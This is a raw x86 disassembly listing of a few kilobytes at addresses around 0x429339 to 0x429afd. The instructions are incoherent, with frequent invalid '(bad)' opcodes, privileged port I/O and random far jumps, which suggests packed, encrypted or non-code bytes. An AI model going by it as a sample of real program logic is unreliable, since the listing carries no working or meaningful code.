  429339:	mov    edx,0xac5b513e
  42933e:	bound  ebp,QWORD PTR [edi+0x127a6969]
  429344:	jns    0x4293ac
  429346:	aas    
  429347:	sbb    cl,BYTE PTR [edi]
  429349:	add    esp,esp
  42934b:	pop    ebp
  42934c:	mov    al,0xb7
  42934e:	cmp    eax,0x1e613a5b
  429353:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429354:	enter  0x19f9,0xa0
  429358:	push   esi
  429359:	or     bl,BYTE PTR [eax+0x57a3c1d4]
  42935f:	addr16 jb 0x429323
  429362:	cmp    DWORD PTR [edx-0x5d7a1678],edx
  429368:	or     al,0x57
  42936a:	or     eax,0x2a05a180
  42936f:	xchg   ecx,eax
  429370:	mov    ecx,0x90553179
  429375:	scas   al,BYTE PTR es:[edi]
  429376:	pusha  
  429377:	dec    ebx
  429378:	and    BYTE PTR [ebx+edx*1],dl
  42937b:	add    BYTE PTR [ebx],ch
  42937d:	mov    BYTE PTR [edx-0x4c],dl
  429380:	mov    BYTE PTR [esi+eax*4],ah
  429383:	popf   
  429384:	adc    al,0xa
  429386:	fbstp  TBYTE PTR [edx-0x65]
  429389:	jle    0x4293c2
  42938b:	cli    
  42938c:	mov    BYTE PTR [ebp+0x1e44d86],dl
  429392:	sub    edx,ebx
  429394:	xchg   esp,eax
  429395:	add    eax,0xd3fbaace
  42939a:	mov    BYTE PTR [ecx],cl
  42939c:	adc    al,0x34
  42939e:	not    DWORD PTR fs:[edi-0x201f02d4]
  4293a5:	mov    al,0xc6
  4293a7:	xchg   ebp,eax
  4293a8:	inc    eax
  4293a9:	popa   
  4293aa:	das    
  4293ab:	stos   BYTE PTR es:[edi],al
  4293ac:	xchg   DWORD PTR [esi-0x12],ebp
  4293af:	xchg   esi,eax
  4293b0:	jl     0x429334
  4293b2:	sbb    eax,0x1e5724b2
  4293b7:	imul   eax,DWORD PTR [edx-0x78],0x3d
  4293bb:	sub    al,0x57
  4293bd:	fisttp WORD PTR [ebx]
  4293bf:	ficom  WORD PTR [ecx+0x6ba5f405]
  4293c5:	mov    WORD PTR [ebp+0x6098a218],ds
  4293cb:	inc    edi
  4293cc:	lods   eax,DWORD PTR ds:[esi]
  4293cd:	sub    al,0xf8
  4293cf:	das    
  4293d0:	cs push ebx
  4293d2:	mov    al,ds:0x8d7dd0d4
  4293d7:	or     al,0x91
  4293d9:	mov    cl,0xc2
  4293db:	or     BYTE PTR [eax+0xda14ea1],0x7d
  4293e2:	test   eax,0x8005b6c4
  4293e7:	cmp    ebp,edx
  4293e9:	or     bh,bl
  4293eb:	mov    ecx,0xf71e4a75
  4293f0:	ins    DWORD PTR es:[edi],dx
  4293f1:	in     al,dx
  4293f2:	rcl    al,1
  4293f4:	mov    al,ds:0x8d4a55a
  4293f9:	cmp    BYTE PTR [edx],cl
  4293fb:	fwait
  4293fc:	dec    ecx
  4293fd:	in     al,dx
  4293fe:	scas   eax,DWORD PTR es:[edi]
  4293ff:	pop    ebx
  429400:	mov    eax,0xe9ede9d1
  429405:	das    
  429406:	mov    ds:0xd81114dc,al
  42940b:	sbb    ebp,DWORD PTR [edx+0x23]
  42940e:	(bad)  
  42940f:	mov    dh,0x88
  429411:	jge    0x429426
  429413:	jb     0x4293a1
  429415:	fnsave [esp+edx*8-0x65358ada]
  42941c:	jb     0x4293a9
  42941e:	lahf   
  42941f:	jl     0x4293c5
  429421:	sub    DWORD PTR [eax+0x5e78943],0x3f
  429428:	jbe    0x4293af
  42942a:	sub    bh,dl
  42942c:	clc    
  42942d:	inc    edx
  42942e:	pop    ebp
  42942f:	add    DWORD PTR [ecx+0x4e],esp
  429432:	xchg   esi,eax
  429433:	div    BYTE PTR [ebp+edi*1+0x1f]
  429437:	mov    eax,ds:0x7fdc3e9e
  42943c:	dec    ebp
  42943d:	(bad)  
  42943e:	nop
  42943f:	cmp    eax,0x2160e288
  429444:	stos   BYTE PTR es:[edi],al
  429445:	loop   0x4293f2
  429447:	mov    bh,0xf6
  429449:	inc    ebx
  42944a:	push   ds
  42944b:	(bad)  
  42944c:	(bad)  
  42944e:	add    eax,0xda7b3067
  429453:	xlat   BYTE PTR ds:[ebx]
  429454:	popa   
  429455:	xor    eax,0x65f3db7d
  42945a:	sbb    dh,bh
  42945c:	xor    al,0x89
  42945e:	xchg   esi,eax
  42945f:	xor    ebx,DWORD PTR [ecx]
  429461:	add    ebx,DWORD PTR [ecx-0x30]
  429464:	in     eax,0x3a
  429466:	mov    al,0x0
  429468:	push   edi
  429469:	add    ch,BYTE PTR [esi-0x3f]
  42946c:	cmp    dh,dh
  42946e:	fadd   st,st(7)
  429470:	mov    esp,0x97f31f5b
  429475:	in     eax,0x2
  429477:	arpl   WORD PTR [edx+0x2e],di
  42947a:	pop    esp
  42947b:	aam    0x71
  42947d:	cwde   
  42947e:	xor    bh,BYTE PTR [esi]
  429480:	xor    ebx,edx
  429482:	ret    
  429483:	loop   0x42946d
  429485:	fsub   DWORD PTR [eax+0x77]
  429488:	add    BYTE PTR [ebx+0x28],bh
  42948b:	mov    ds:0xd44d7ffc,al
  429490:	iret   
  429491:	xchg   BYTE PTR [esi+0x6fba2ed4],dh
  429497:	mov    cl,0x89
  429499:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42949a:	loope  0x4294d8
  42949c:	push   edx
  42949d:	(bad)  
  42949e:	jnp    0x429511
  4294a0:	aaa    
  4294a1:	ss push eax
  4294a3:	jl     0x429443
  4294a5:	add    bh,BYTE PTR [eax+0x19]
  4294a8:	push   0xffffffe6
  4294aa:	cld    
  4294ab:	xlat   BYTE PTR ds:[ebx]
  4294ac:	mov    cl,BYTE PTR [ecx]
  4294ae:	pop    esi
  4294af:	cmp    eax,0x4343d192
  4294b4:	pop    eax
  4294b5:	inc    ecx
  4294b6:	mov    bl,0xab
  4294b8:	xchg   DWORD PTR [ebx-0x2e],ecx
  4294bb:	out    dx,eax
  4294bc:	jge    0x429513
  4294be:	call   0x8e1dcbd8
  4294c3:	push   0xece47b88
  4294c8:	out    dx,eax
  4294c9:	in     eax,dx
  4294ca:	mov    ah,0x6b
  4294cc:	stc    
  4294cd:	cmp    eax,0xd8345dec
  4294d2:	xchg   edx,eax
  4294d3:	iret   
  4294d4:	hlt    
  4294d5:	push   cs
  4294d6:	pop    ds
  4294d7:	pop    edi
  4294d8:	sti    
  4294d9:	shl    BYTE PTR ds:0x1f4f5f78,1
  4294df:	arpl   WORD PTR [esi+esi*4],bp
  4294e2:	inc    esp
  4294e3:	pop    edx
  4294e4:	add    dl,ah
  4294e6:	mov    eax,ds:0x76f80ba3
  4294eb:	cli    
  4294ec:	mov    BYTE PTR [ebx],ah
  4294ee:	jl     0x42951e
  4294f0:	ins    BYTE PTR es:[edi],dx
  4294f1:	fisub  DWORD PTR [eax+0x79]
  4294f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4294f5:	(bad)  
  4294f6:	loopne 0x4294ac
  4294f8:	add    eax,0x5e40c2f0
  4294fd:	jmp    0x42954b
  4294ff:	imul   ebx,DWORD PTR [edi+0x17520602],0x89240f06
  429509:	mov    bh,0xd0
  42950b:	mov    ecx,0x12ce2904
  429510:	(bad)  
  429511:	icebp  
  429512:	pop    esp
  429513:	aam    0xf6
  429515:	mov    ds:0x1e54bdd4,al
  42951a:	test   DWORD PTR [edx-0x2bbfe208],ebx
  429520:	pop    ds
  429521:	clc    
  429522:	or     esi,DWORD PTR [ebx+0x14]
  429525:	ss out 0xd4,al
  429528:	mov    esp,0xc0fd3b76
  42952d:	jne    0x429521
  42952f:	or     DWORD PTR [ecx-0x7a6e2fd7],ecx
  429535:	xlat   BYTE PTR ds:[ebx]
  429536:	mov    BYTE PTR [esi+ebp*1+0x260bc002],dl
  42953d:	dec    esp
  42953e:	mov    bh,0x17
  429540:	sbb    BYTE PTR [ebp+0x68],0x19
  429544:	xor    bh,BYTE PTR [eax]
  429546:	xchg   esp,eax
  429547:	jb     0x4294df
  429549:	gs popa 
  42954b:	xchg   esp,eax
  42954c:	call   0x9c25:0x3b63eaa2
  429553:	(bad)  
  429554:	scas   eax,DWORD PTR es:[edi]
  429555:	rcr    DWORD PTR [edi-0x72],1
  429558:	push   0x88226eb9
  42955d:	jecxz  0x429556
  42955f:	and    eax,0x6a82eb0b
  429564:	loop   0x4294ef
  429566:	xor    DWORD PTR [eax],ebp
  429568:	mov    ecx,DWORD PTR [esi]
  42956a:	or     al,0xe9
  42956c:	stos   DWORD PTR es:[edi],eax
  42956d:	sar    DWORD PTR [edi+0x1fdf3174],1
  429573:	jnp    0x4295f3
  429575:	adc    al,0xfb
  429577:	and    DWORD PTR [ebx+edx*4-0x7c3b5d47],edx
  42957e:	sbb    DWORD PTR [ebp+0x20],ecx
  429581:	adc    ebx,DWORD PTR [ebp+0x2b]
  429584:	or     edx,esp
  429586:	ja     0x4295a2
  429588:	pop    esp
  429589:	idiv   DWORD PTR [ecx-0x56]
  42958c:	je     0x429540
  42958e:	jmp    0xb925c0b1
  429593:	ins    DWORD PTR es:[edi],dx
  429594:	mov    al,0xc5
  429596:	jl     0x4295a9
  429598:	outs   dx,BYTE PTR ds:[esi]
  429599:	cmp    edi,esp
  42959b:	xchg   ebp,eax
  42959c:	xchg   edi,eax
  42959d:	int3   
  42959e:	sbb    eax,0x1d0eaec3
  4295a3:	aam    0x8d
  4295a5:	mov    esi,0x5b44c3f5
  4295aa:	and    al,0x6f
  4295ac:	mov    BYTE PTR [ebp+0x52],al
  4295af:	xchg   ebx,eax
  4295b0:	jmp    0x8306:0x72332022
  4295b7:	aad    0x21
  4295b9:	xchg   esi,eax
  4295ba:	mov    al,0x8d
  4295bc:	mov    edx,0x6a8df306
  4295c1:	scas   al,BYTE PTR es:[edi]
  4295c2:	adc    BYTE PTR [ecx+ecx*4],ch
  4295c5:	push   ebx
  4295c6:	push   es
  4295c7:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4295c9:	jns    0x42955b
  4295cb:	ja     0x429597
  4295cd:	add    eax,0xe68fc32a
  4295d2:	int    0xc9
  4295d4:	mov    ds:0xbfa95c6f,eax
  4295d9:	popf   
  4295da:	loopne 0x4295ff
  4295dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4295dd:	and    eax,0x3107492
  4295e2:	(bad)  
  4295e3:	push   ebx
  4295e4:	xchg   BYTE PTR [eax+0x29d01793],ah
  4295ea:	pop    ebx
  4295eb:	pop    edi
  4295ec:	mov    dh,0x6f
  4295ee:	pop    ds
  4295ef:	(bad)  
  4295f1:	das    
  4295f2:	sub    BYTE PTR [eax-0x588b2992],0x75
  4295f9:	adc    ebp,DWORD PTR [ebx+0x45868f22]
  4295ff:	test   DWORD PTR [eax+0xb],edi
  429602:	sub    eax,0x43f188ea
  429607:	xor    bl,BYTE PTR [ebx+0x5a]
  42960a:	sub    cl,BYTE PTR [edi+0x1a280330]
  429610:	push   ss
  429611:	sub    ebp,eax
  429613:	dec    edi
  429614:	sbb    eax,0x6d471f2b
  429619:	mov    WORD PTR [esi-0x74b505e6],?
  42961f:	inc    esp
  429620:	in     eax,0x5
  429622:	mov    esp,?
  429624:	add    edx,0xffffff87
  429627:	push   0xffffffaf
  429629:	jecxz  0x42968b
  42962b:	push   ebp
  42962c:	mov    ecx,ecx
  42962e:	hlt    
  42962f:	and    al,0x1a
  429631:	repnz add dl,ah
  429634:	addr16 sbb al,0x3
  429637:	inc    edi
  429638:	cmp    edi,esp
  42963a:	mov    WORD PTR [eax-0x78],fs
  42963d:	add    DWORD PTR [eax+esi*2],edx
  429640:	pop    ss
  429641:	aaa    
  429642:	outs   dx,DWORD PTR es:[esi]
  429644:	jge    0x429648
  429646:	jp     0x429670
  429648:	push   ebx
  429649:	(bad)  
  42964a:	aad    0xbb
  42964c:	pop    ds
  42964d:	retf   
  42964e:	pop    ds
  42964f:	aas    
  429650:	mov    al,0x35
  429652:	inc    ebx
  429653:	sub    BYTE PTR [eax],ah
  429655:	jle    0x429693
  429657:	aam    0xcd
  429659:	sbb    BYTE PTR [esi+0x4977a3ad],ch
  42965f:	xchg   esp,eax
  429660:	mov    bh,dh
  429662:	shr    DWORD PTR [edx],1
  429664:	loope  0x4296ca
  429666:	pop    esi
  429667:	mov    bl,0xf7
  429669:	pop    ds
  42966a:	push   eax
  42966b:	into   
  42966c:	test   DWORD PTR [ebx],esp
  42966e:	stos   BYTE PTR es:[edi],al
  42966f:	(bad)  
  429671:	add    BYTE PTR [esi],0x99
  429674:	adc    ecx,DWORD PTR ds:0x1e5d4b7d
  42967a:	fsub   st(3),st
  42967c:	pop    dx
  42967e:	sahf   
  42967f:	push   ebx
  429680:	mov    ds:0xbbec66c2,al
  429685:	cli    
  429686:	(bad)  
  429687:	sbb    al,0x22
  429689:	sar    DWORD PTR [ebx-0x1],0x60
  42968d:	mov    edi,0xa49615f
  429692:	inc    ebx
  429693:	push   eax
  429694:	mov    cl,bh
  429696:	xchg   ecx,eax
  429697:	les    esp,FWORD PTR ds:0xb7e78d8a
  42969d:	mov    es,WORD PTR [edi-0x32]
  4296a0:	mov    ?,WORD PTR [edx-0x310b14d7]
  4296a6:	pop    edi
  4296a7:	into   
  4296a8:	jns    0x4296e3
  4296aa:	push   ds
  4296ab:	std    
  4296ac:	xchg   edi,eax
  4296ad:	pop    edx
  4296ae:	loope  0x429674
  4296b0:	jb     0x429692
  4296b2:	lods   al,BYTE PTR ds:[esi]
  4296b3:	aam    0xdc
  4296b5:	rcl    BYTE PTR [esi+0x51],cl
  4296b8:	(bad)  
  4296b9:	mov    ds:0xa78db50b,al
  4296be:	ret    0xe76
  4296c1:	jge    0x429704
  4296c3:	adc    al,0x42
  4296c5:	arpl   ax,bp
  4296c7:	aad    0x9d
  4296c9:	pop    ebx
  4296ca:	cmp    al,0xda
  4296cc:	or     al,bl
  4296ce:	retf   0xb4e7
  4296d1:	xchg   ebx,eax
  4296d2:	lock leave 
  4296d4:	mov    BYTE PTR [ebp+eiz*4-0x54],dh
  4296d8:	mov    al,ds:0xc49e7ff6
  4296dd:	call   0xfc54:0xca9dd42b
  4296e4:	mov    eax,ds:0xea6159e1
  4296e9:	pop    esi
  4296ea:	pop    ebx
  4296eb:	(bad)  
  4296ec:	xor    DWORD PTR [edx*1-0x5ef7492a],edi
  4296f3:	test   al,0xd5
  4296f5:	push   edi
  4296f6:	pop    esi
  4296f7:	shr    DWORD PTR [edx-0x316611fa],0x4a
  4296fe:	pop    esi
  4296ff:	cmp    dh,dl
  429701:	and    dh,bl
  429703:	push   esp
  429704:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429705:	retf   0xc340
  429708:	mov    DWORD PTR [ebx+0x601655f3],esp
  42970e:	mov    DWORD PTR [edx+0x39a417fc],esi
  429714:	push   edi
  429715:	mov    ebx,0xd60cd474
  42971a:	fidivr DWORD PTR [ecx-0x38]
  42971d:	xchg   esp,eax
  42971e:	test   BYTE PTR [esi-0x80],bl
  429721:	sub    esi,DWORD PTR ds:0x650845b9
  429727:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429728:	inc    ebx
  429729:	inc    ebx
  42972a:	neg    DWORD PTR [edi]
  42972c:	sub    BYTE PTR [edx],al
  42972e:	xor    al,0x4c
  429730:	push   edx
  429731:	inc    ebx
  429732:	push   cs
  429733:	mov    dh,0x98
  429735:	push   ebx
  429736:	pop    ds
  429737:	mov    edi,0x3e566231
  42973c:	pusha  
  42973d:	pop    eax
  42973e:	not    ch
  429740:	cmp    eax,0x6299a50b
  429745:	cmp    BYTE PTR [edi+esi*1],al
  429748:	mov    DWORD PTR [ecx-0x12],ebx
  42974b:	test   DWORD PTR [ebp+eiz*8+0x63],0xe405deb9
  429753:	and    bl,bh
  429755:	sbb    al,al
  429757:	mov    edi,0xe71e2d53
  42975c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42975d:	jge    0x429763
  42975f:	xchg   edx,eax
  429760:	inc    esi
  429761:	dec    eax
  429762:	mov    bl,0xaa
  429764:	mov    al,0x97
  429766:	stos   DWORD PTR es:[edi],eax
  429767:	jl     0x4297de
  429769:	ret    0x4921
  42976c:	out    dx,al
  42976d:	push   edi
  42976e:	ins    DWORD PTR es:[edi],dx
  42976f:	ins    DWORD PTR es:[edi],dx
  429770:	cmp    cl,cl
  429772:	pop    eax
  429773:	shr    BYTE PTR [eax],0x72
  429776:	ror    BYTE PTR [edi],cl
  429778:	das    
  429779:	add    edx,eax
  42977b:	ins    DWORD PTR es:[edi],dx
  42977c:	ds (bad) 
  42977e:	xchg   esi,eax
  42977f:	inc    ecx
  429780:	push   ecx
  429781:	mov    bl,0x1f
  429783:	mov    cl,0x8
  429785:	out    dx,eax
  429786:	popf   
  429787:	sbb    eax,edi
  429789:	(bad)  
  42978a:	jmp    0x7e6fef83
  42978f:	and    al,0xed
  429791:	mov    dl,0x60
  429793:	fcomp  QWORD PTR [esi]
  429795:	cmp    BYTE PTR [esi+0x4a],dl
  429798:	mov    edi,ebp
  42979a:	adc    eax,0xd3f854f2
  42979f:	ds adc eax,0x459f581d
  4297a5:	push   0xdaf9dfa3
  4297aa:	inc    BYTE PTR [ebx]
  4297ac:	(bad)  
  4297ad:	mov    bl,0xc9
  4297af:	mov    ebp,0xf48c22bb
  4297b4:	lock add eax,DWORD PTR [ebx+esi*1-0xa]
  4297b9:	add    eax,DWORD PTR [eax-0x1f]
  4297bc:	adc    bh,BYTE PTR [ecx+0x6e2205a8]
  4297c2:	push   ds
  4297c3:	arpl   WORD PTR [esp+eiz*2],sp
  4297c6:	push   eax
  4297c7:	jnp    0x4297e7
  4297c9:	leave  
  4297ca:	inc    ebx
  4297cb:	aad    0x85
  4297cd:	retf   
  4297ce:	cli    
  4297cf:	xor    eax,0xf437e444
  4297d4:	mov    DWORD PTR [ecx],ebp
  4297d6:	xchg   esi,eax
  4297d7:	test   DWORD PTR [eax+0x58],0x5839ebb
  4297de:	pushf  
  4297df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4297e0:	lods   eax,DWORD PTR ds:[esi]
  4297e1:	sbb    ebp,ebp
  4297e3:	add    edi,edi
  4297e5:	cmp    DWORD PTR [ebp-0x2d],0xc
  4297e9:	jo     0x429810
  4297eb:	push   0xffffffbe
  4297ed:	push   es
  4297ee:	ret    0xe958
  4297f1:	mov    eax,ds:0x14d1ccf0
  4297f6:	or     bl,BYTE PTR [ebp-0x12]
  4297f9:	mov    dl,0x21
  4297fb:	push   ss
  4297fc:	jp     0x4297c4
  4297fe:	mov    al,0x2c
  429800:	out    dx,eax
  429801:	adc    DWORD PTR [esi+0x2d],esp
  429804:	sub    al,BYTE PTR [di]
  429807:	dec    edx
  429808:	or     DWORD PTR [edi-0x6e],edi
  42980b:	mov    dl,0x32
  42980d:	jmp    0xff27:0x5b8fa762
  429814:	mov    DWORD PTR [eax-0x51],esi
  429817:	rcr    BYTE PTR ds:0x2bff562f,0x76
  42981e:	pop    ds
  42981f:	push   0xffffff93
  429821:	sahf   
  429822:	mov    edi,0x221c23dc
  429827:	inc    esi
  429828:	xor    BYTE PTR [eax],al
  42982a:	xchg   edi,eax
  42982b:	inc    esi
  42982c:	leave  
  42982d:	cld    
  42982e:	out    0xd4,al
  429830:	pusha  
  429831:	push   es
  429832:	pop    ds
  429833:	das    
  429834:	sahf   
  429835:	push   ebp
  429836:	ss adc eax,0xcdd2317f
  42983c:	jp     0x429883
  42983e:	and    ch,BYTE PTR [edx]
  429840:	ins    BYTE PTR es:[edi],dx
  429841:	add    ah,BYTE PTR [ecx+0x2c]
  429844:	fdivr  QWORD PTR [esp+ecx*4-0x6a0a7799]
  42984b:	and    al,0x75
  42984d:	or     bh,ch
  42984f:	jl     0x42980c
  429851:	sub    al,0xc8
  429853:	dec    esp
  429854:	adc    eax,0x67d21f29
  429859:	(bad)  
  42985b:	int    0x89
  42985d:	cdq    
  42985e:	xor    eax,DWORD PTR [eax+0x2b]
  429861:	mov    cl,0xad
  429863:	dec    eax
  429864:	gs add esp,esp
  429867:	add    DWORD PTR [ebx+0x7e],edx
  42986a:	mov    bh,0x59
  42986c:	adc    eax,0x47f76de7
  429871:	add    al,0xba
  429873:	cwde   
  429874:	push   0xc3e70600
  429879:	sub    DWORD PTR [edx-0xf],eax
  42987c:	push   ebx
  42987d:	popa   
  42987e:	fild   WORD PTR [eax]
  429880:	dec    edx
  429881:	inc    edi
  429882:	or     dh,BYTE PTR [edx+0x2f4bb86c]
  429888:	es push eax
  42988a:	pop    ds
  42988b:	sbb    DWORD PTR [ecx-0x42],ebp
  42988e:	add    al,0x19
  429890:	fild   WORD PTR ds:0x2367d3de
  429896:	cs repz dec edi
  429899:	mov    BYTE PTR [edi],bh
  42989b:	or     BYTE PTR [eax+0x16ad9e3],0xac
  4298a2:	mov    ecx,0x1c03db6d
  4298a7:	fs ss pop ss
  4298aa:	push   eax
  4298ab:	jg     0x42985b
  4298ad:	sbb    ah,BYTE PTR [ebx]
  4298af:	arpl   WORD PTR [ebx],cx
  4298b1:	pop    esp
  4298b2:	push   ds
  4298b3:	adc    BYTE PTR [esi+ebp*8+0x6f13d46f],ah
  4298ba:	push   0xb8980dcb
  4298bf:	adc    eax,0x63e6588
  4298c4:	sbb    al,0x66
  4298c6:	fdivp  st(0),st
  4298c8:	or     esp,DWORD PTR [edi-0x2e]
  4298cb:	iret   
  4298cc:	cmp    al,BYTE PTR [ebx]
  4298ce:	inc    eax
  4298cf:	out    0x85,al
  4298d1:	xchg   edx,eax
  4298d2:	sub    DWORD PTR [ebx+0x6589b786],esp
  4298d8:	lds    esp,FWORD PTR [esi]
  4298da:	fistp  QWORD PTR [ebx+0x5a]
  4298dd:	loopne 0x4298d0
  4298df:	aad    0x34
  4298e1:	jnp    0x4298d3
  4298e3:	adc    al,0x43
  4298e5:	sub    BYTE PTR [ebx+0x1],dh
  4298e8:	mov    DWORD PTR [ebp+0x3f3a7862],ebp
  4298ee:	leave  
  4298ef:	das    
  4298f0:	cmp    BYTE PTR [edx],al
  4298f2:	(bad)  
  4298f3:	xor    al,0x1a
  4298f5:	xor    eax,0x3a816387
  4298fa:	pusha  
  4298fb:	shl    ebx,0xce
  4298fe:	cmp    ebp,esi
  429900:	(bad)  
  429902:	cmp    BYTE PTR [ebx-0x545ef8b4],bh
  429908:	das    
  429909:	dec    edi
  42990a:	mov    BYTE PTR [ebx],ah
  42990c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42990d:	bound  ebx,QWORD PTR [esi+0x1e]
  429910:	fild   DWORD PTR [edi-0x71]
  429913:	imul   edi,DWORD PTR [eax-0x72],0x9030d5b9
  42991a:	test   al,0x37
  42991c:	adc    al,0x9a
  42991e:	(bad)  
  429920:	fsubr  DWORD PTR [esi-0x27e1f6ab]
  429926:	and    cl,cl
  429928:	inc    eax
  429929:	push   0x31d8791e
  42992e:	pop    ebx
  42992f:	stc    
  429930:	jl     0x4298fe
  429932:	or     BYTE PTR [ebp-0x718538ca],ch
  429938:	xlat   BYTE PTR ds:[ebx]
  429939:	retf   
  42993a:	xchg   edx,eax
  42993b:	mov    ds:0x1136bb65,al
  429940:	mov    ch,dl
  429942:	xchg   ebp,eax
  429943:	je     0x4299b4
  429945:	push   esp
  429946:	ror    BYTE PTR [esi-0x419fd70],0x74
  42994d:	lods   al,BYTE PTR ds:[esi]
  42994e:	repnz lea esp,[eax+0x51]
  429952:	pop    ds
  429953:	scas   eax,DWORD PTR es:[edi]
  429954:	test   BYTE PTR [eax+0x3b4e99e],bh
  42995a:	rcl    esp,0x36
  42995d:	sbb    esi,DWORD PTR [esi-0x5adc45ff]
  429963:	jecxz  0x4298ee
  429965:	popa   
  429966:	jmp    0x6caa:0xb668bd93
  42996d:	repz pushf 
  42996f:	aad    0x47
  429971:	mov    cl,0xd1
  429973:	inc    esp
  429974:	data16 sub ah,0xd0
  429978:	xchg   esi,eax
  429979:	jmp    0x4299d5
  42997b:	js     0x4299fb
  42997d:	jmp    DWORD PTR [eax+0xb]
  429980:	jl     0x4299bc
  429982:	pop    es
  429983:	imul   esp,DWORD PTR ds:0x914e6403,0x13ffb5a8
  42998d:	gs popa 
  42998f:	dec    ecx
  429990:	in     al,dx
  429991:	ins    BYTE PTR es:[edi],dx
  429992:	cmc    
  429993:	nop
  429994:	fwait
  429995:	or     eax,0x241b63df
  42999a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42999b:	jne    0x429936
  42999d:	jae    0x4299bd
  42999f:	out    dx,eax
  4299a0:	stc    
  4299a1:	or     BYTE PTR [edx+0x44],bh
  4299a4:	js     0x42996a
  4299a6:	pusha  
  4299a7:	dec    edi
  4299a8:	pop    ecx
  4299a9:	xchg   edx,eax
  4299aa:	jg     0xd679f72e
  4299b0:	data16 cmp BYTE PTR ds:0xb24404d,bh
  4299b7:	push   DWORD PTR [edx+0x611d1fad]
  4299bd:	loope  0x4299ec
  4299bf:	push   ecx
  4299c0:	pusha  
  4299c1:	xchg   esp,eax
  4299c2:	jbe    0x429965
  4299c4:	ja     0x4299d9
  4299c6:	fisub  WORD PTR [edi+0x59]
  4299c9:	adc    eax,0x618f20f2
  4299ce:	push   0x8c0b4916
  4299d3:	jb     0x42995d
  4299d5:	xor    eax,0x9f98e091
  4299da:	inc    edx
  4299db:	je     0x4299dd
  4299dd:	add    ecx,DWORD PTR [esi]
  4299df:	fmulp  st(5),st
  4299e1:	push   eax
  4299e2:	rcl    bh,cl
  4299e4:	jns    0x429971
  4299e6:	jge    0x4299b5
  4299e8:	push   ss
  4299e9:	fstp   QWORD PTR [ebx]
  4299eb:	aam    0x45
  4299ed:	div    DWORD PTR [esi+0x2206b0c9]
  4299f3:	in     al,0xc0
  4299f5:	add    al,BYTE PTR [esi-0x15]
  4299f8:	sub    dh,BYTE PTR [esi-0x71505c1d]
  4299fe:	das    
  4299ff:	or     DWORD PTR [ebx-0x5d5f98b1],0x14
  429a06:	sub    ebp,esp
  429a08:	add    cl,al
  429a0a:	inc    edi
  429a0b:	aam    0x42
  429a0d:	sbb    al,0xdd
  429a0f:	mov    edx,0x199b5e1f
  429a14:	mov    ecx,edi
  429a16:	int    0x9f
  429a18:	aam    0xd5
  429a1a:	jnp    0x4299b9
  429a1c:	add    DWORD PTR [ebx],eax
  429a1e:	xchg   esi,eax
  429a1f:	pop    DWORD PTR [edi+ebx*8]
  429a22:	and    bl,0x6a
  429a25:	je     0x429a45
  429a27:	fwait
  429a28:	mov    edi,0x20c16ad3
  429a2d:	ds mov dl,0xd3
  429a30:	xchg   edi,eax
  429a31:	push   ebx
  429a32:	aaa    
  429a33:	ss je  0x4299fa
  429a36:	add    BYTE PTR [ecx],cl
  429a38:	inc    ecx
  429a39:	and    BYTE PTR [eax+0x3d],ah
  429a3c:	jecxz  0x429a19
  429a3e:	lock sub BYTE PTR [ecx],dl
  429a41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429a42:	iret   
  429a43:	retf   0x2ed
  429a46:	mov    al,0xd7
  429a48:	jae    0x429ab1
  429a4a:	retf   
  429a4b:	(bad)  
  429a4c:	fbstp  TBYTE PTR [esi]
  429a4e:	push   ds
  429a4f:	xor    edi,DWORD PTR [esi]
  429a51:	pop    esp
  429a52:	outs   dx,BYTE PTR ds:[esi]
  429a53:	(bad)
  429a56:	iret   
  429a57:	stos   BYTE PTR es:[edi],al
  429a58:	data16 data16 and al,0xd2
  429a5c:	mov    edi,0x21de2e05
  429a61:	fldenv [eax+0x6f]
  429a64:	mov    edx,0x86de66c6
  429a69:	fwait
  429a6a:	and    esi,edx
  429a6c:	call   0x609562e4
  429a71:	dec    ebx
  429a72:	pop    eax
  429a73:	in     al,0x67
  429a75:	cmp    eax,0x48fe8565
  429a7a:	xor    BYTE PTR [ebx],0x5c
  429a7d:	fdiv   QWORD PTR [esi-0x10cd8d9d]
  429a83:	mov    dl,0xf8
  429a85:	repz ja 0x429a5d
  429a88:	mov    edx,0xc280fe8e
  429a8d:	cmp    BYTE PTR [ecx+0x23],0x88
  429a91:	mov    DWORD PTR [edx],ecx
  429a93:	es adc eax,0x671bf545
  429a99:	add    eax,DWORD PTR [eax+0x639480a4]
  429a9f:	dec    ecx
  429aa0:	popf   
  429aa1:	jae    0x429ac1
  429aa3:	xchg   ebp,eax
  429aa4:	jne    0x429a42
  429aa6:	jne    0x429ab1
  429aa8:	ror    dh,1
  429aaa:	add    esp,edx
  429aac:	scas   eax,DWORD PTR es:[edi]
  429aad:	sub    BYTE PTR [ecx-0x5e3ea3d0],bh
  429ab3:	mov    ch,0x86
  429ab5:	dec    ebx
  429ab6:	push   0x7f7e9992
  429abb:	or     DWORD PTR [ebx-0x1fe3fccd],ebp
  429ac1:	dec    ebx
  429ac2:	ins    DWORD PTR es:[edi],dx
  429ac3:	push   ecx
  429ac4:	cmp    BYTE PTR [ecx],0xd0
  429ac7:	jne    0x429a87
  429ac9:	ins    BYTE PTR es:[edi],dx
  429aca:	popa   
  429acb:	add    al,0x89
  429acd:	jae    0x429b3a
  429acf:	popf   
  429ad0:	cmp    eax,0x523c38bd
  429ad5:	add    cl,al
  429ad7:	sar    ebx,0x3
  429ada:	inc    edx
  429adb:	or     ah,0xb7
  429ade:	gs popa 
  429ae0:	fsub   DWORD PTR [esp+esi*4]
  429ae3:	adc    eax,0x85d8a2a4
  429ae8:	lahf   
  429ae9:	add    eax,0xd906e27c
  429aee:	push   es
  429aef:	dec    ecx
  429af0:	mov    al,ds:0xda5d6db6
  429af5:	outs   dx,BYTE PTR ds:[esi]
  429af6:	hlt    
  429af7:	push   esp
  429af8:	sub    BYTE PTR [ecx+0x17],dh
  429afb:	not    DWORD PTR [esi]
  429afd:	add    ecx,esp
